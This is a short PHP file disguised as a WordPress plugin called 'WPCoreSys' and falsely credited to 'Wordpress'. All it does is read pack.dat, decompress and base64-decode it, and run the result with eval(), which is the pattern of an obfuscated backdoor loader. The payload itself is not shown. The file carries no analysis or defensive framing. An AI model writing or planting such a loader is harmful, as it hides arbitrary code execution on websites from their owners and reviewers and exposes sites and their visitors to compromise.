<?php

/*
* Plugin Name: WPCoreSys
* Version: 4.0
* Author: Wordpress
*/

$code = file_get_contents(__DIR__ . "/pack.dat");
$code = base64_decode(zlib_decode($code));

eval($code);

?>